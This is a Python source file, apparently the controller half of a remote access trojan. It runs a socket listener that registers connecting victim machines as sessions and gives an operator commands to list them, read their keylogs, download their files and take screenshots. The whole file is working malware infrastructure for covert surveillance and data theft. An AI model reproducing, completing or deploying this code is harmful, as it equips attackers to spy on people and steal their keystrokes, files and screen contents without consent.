import socket
import threading
import utility
import modules.client as client


class Manager:
    def __init__(self, *, host: str = "127.0.0.1", port: int = 1337) -> None:
        self._host = host
        self._port = port
        self._nextcid = 1
        self._clients = []
        self._commands = {
            "connections": {
                "func": self._connections,
                "description": "Display a list of connected clients",
            },
            "keylogs": {
                "description": "View the keylogs of a session",
                "arguments": ["session_id"],
            },
            "download": {
                "description": "Download a file from a session",
                "arguments": ["session_id", "file_path"],
            },
            "screenshot": {
                "description": "Capture a screenshot from a session",
                "arguments": ["session_id"],
            },
        }
        self.connection_listener()

    # getters ------------------------------------------------------------------

    def get_commands(self) -> dict[str, dict[str, str | list[str]]]:
        """Returns a dictionary of all available commands and their descriptions
            within the manager context.

        Returns:
            [type]: [description]
        """
        return self._commands

    def get_client(self, cid: str) -> None:
        return (
            next((x for x in self._clients if x.cid == int(cid)), None)
            if cid.isnumeric()
            else None
        )

    def _connections(self) -> None:
        """Display a formatted list with information about all connected clients"""
        # if there are no connected clients...
        if not self._clients:
            # Notify the user that there are no connected clients
            print(utility.padded("No clients connected"))
        else:  # otherwise, display a list of connected clients
            # get the longest cid length for formatting purposes
            longest_id = len(str(max(map(lambda x: x.cid, self._clients))))
            # generator containing formatted strings relative to each client
            sessions = (
                str(c.cid).ljust(longest_id)
                + " | "
                + "{}:{}".format(*c.sock.getpeername())
                for c in self._clients
            )
            # display the list with each item on a new line
            print(utility.padded("\n".join(sessions)))

    # command handling ---------------------------------------------------------

    def handle_command(self, cmd: str, *args) -> None:
        """Handles a command from the user being passed from the main interface

        Args:
            cmd (str): Command string executed by the user
        """
        # if the entered command is not recognised...
        if not (command := self._commands.get(cmd)):
            # display an error message
            print(utility.padded(f"Command '{cmd}' does not exist"))
            return
        # if the command has a function defined within the manager class context...
        if func := command.get("func"):
            # execute said function passing in x number of arguments depending on the command
            func(*args[: len(command.get("arguments", []))])
        else:
            # otherwise, attempt to find a specified client based on the potentially inpuit cid
            if len(args) < len(command.get("arguments", [])):
                formatted_args = " ".join(
                    map(lambda x: f"<{x}>", command.get("arguments", []))
                )
                print(utility.padded(f"Usage: {cmd} {formatted_args}"))
            else:
                cid, *args = args
                # if the client is found...
                if specified_client := self.get_client(cid):
                    # pass the command through to the client and execute on said client
                    specified_client.execute(cmd, *args)
                else:
                    print(utility.padded(f"Client with ID `{cid}` does not exist"))

    # connection handling ------------------------------------------------------

    def _handle_connection(self, conn: socket.socket, addr: tuple) -> None:
        """Called by connection listener on the event of a connection by a client

        Args:
            conn (socket.socket): Socket connection of the client
            addr (tuple): Addressing information of the client
        """
        print(utility.padded(f"Connection from {addr[0]}:{addr[1]}", bottom=0))
        new_client = client.Client(conn=conn, cid=self._nextcid, manager=self)
        self._clients.append(new_client)
        self._nextcid += 1

    def connection_listener(self) -> None:
        """Listener for incoming socket connections"""

        def listen():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                try:
                    sock.bind((self._host, self._port))
                except OSError as exception:
                    raise OSError(
                        f"Unable to bind to {self._host}:{self._port}; "
                        "This may be because the specified host address is invalid, "
                        "or the specified port number is already in use."
                    ) from exception
                sock.listen()
                while True:
                    conn, addr = sock.accept()
                    threading.Thread(
                        target=self._handle_connection, args=(conn, addr)
                    ).start()

        threading.Thread(target=listen, daemon=True).start()
